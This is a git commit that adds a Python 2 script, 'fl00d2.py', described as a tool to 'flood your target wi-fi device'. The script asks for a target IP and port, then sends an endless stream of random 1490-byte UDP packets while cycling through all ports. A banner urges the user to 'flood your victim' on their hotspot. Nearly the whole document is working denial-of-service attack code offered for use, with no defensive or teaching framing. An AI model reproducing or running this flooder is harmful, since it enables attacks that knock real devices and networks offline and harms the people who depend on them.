035064ccb6040f3c6512bd154a69c9296b684689
salik57 <61610355+salik57@users.noreply.github.com>
2020-07-02 13:11:44 +0530

    Flood your target wi-fi device

---
+++ fl00d2.py
@@ -0,0 +1,51 @@
+
+import socket, os, random, time
+
+# Color
+B = '\033[1m'
+R = '\033[31m'
+N = '\033[0m'
+
+# Code time ##################
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+##############################
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+os.system("clear")
+print B+"@@@@@@@@ @@@      @@@@@@@@   @@@@@@@@  @@@@@@@@"
+print "@@@@@@@@ @@@     @@@@@@@@@@ @@@@@@@@@@ @@@   @@@@"
+print "@@!      @@!     @@!   @@@@ @@!   @@@@ @@!     @@@"
+print "!@!      !@!     !@!  @!@!@ !@!  @!@!@ !@!      @!@"
+print "@!!!:!   @!!     @!@ @! !@! @!@ @! !@! @!@      !@!"
+print "!!!!!:   !!!     !@!!!  !!! !@!!!  !!! !@!      !!!"
+print "!!:      !!:     !!:!   !!! !!:!   !!! !!:      !!!"
+print ":!:      :!:     :!:    !:! :!:    !:! :!:     !:!"
+print ":::      ::::::: :::::::::: :::::::::: ;::    :::"
+print ":::      :::::::  ::::::::   ::::::::  :::::::::"+N
+print "["+B+""+R+"#"+N+"] "+B+""+R+"Modified by Salik"+N+"   Fl00d 2.2 - "+B+""+R+"Salick.gq"+N
+print
+print "#www.instagram.com/s_a_l_i_c_k_"
+print "#Now flood your victim,who connects your Hotspot without your permission."
+
+print
+ip = raw_input('[$] T@rget 1P: ')
+port = input('[$] P0rt: ')
+os.system("clear")
+print "Fl00d attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
+time.sleep(3)
+print
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
